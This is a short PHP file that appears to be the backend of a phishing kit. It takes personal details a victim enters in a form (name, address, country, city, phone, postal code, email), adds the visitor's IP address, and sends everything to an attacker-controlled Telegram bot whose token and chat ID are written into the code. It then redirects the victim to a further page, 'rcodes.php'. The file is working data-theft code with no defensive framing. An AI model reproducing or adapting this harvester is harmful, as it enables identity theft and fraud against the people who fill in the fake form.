<?php

// include('./config.php');

session_start();

$ip = $_SERVER['REMOTE_ADDR'];
$message .= "--------------  from inf ----------------\n";
$message .= "Nom   : " . $_POST['nom'] . "\n";
$message .= "Prenom : " . $_POST['prenom'] . "\n";
$message .= "adresse    : " . $_POST['adresse'] . "\n";
$message .= "pays       : " . $_POST['pays'] . "\n";
$message .= "ville      : " . $_POST['ville'] . "\n";
$message .= "telephone   : " . $_POST['telephone'] . "\n";
$message .= "Postal     : " . $_POST['zip'] . "\n";
$message .= "E-mail     : " . $_POST['email'] . "\n";
$message .= "IP      : $ip\n";
///     var_dump($_POST);exit;
$_SESSION['name'] = $_POST['nom'] . ' ' . $_POST['prenom'];
$_SESSION['bonus'] = $_POST['bonus'];



$params = base64_encode("pays=" . $_POST['pays'] . "&ip=" . $ip . "&montant=" . $_SESSION['bonus']);


file_get_contents("https://api.telegram.org/bot7625805299:AAGABz5u4JHYtB0YwHjmiaMSF2O4Zlv0z80/sendMessage?chat_id=6996434307&text=" . urlencode($message) . "&parse_mode=html");




// header('Location:' . $_SESSION["url"] . '/be?parameters=' . $params);
//header('Location: .php?parameters=' . $params);
header('location: rcodes.php');
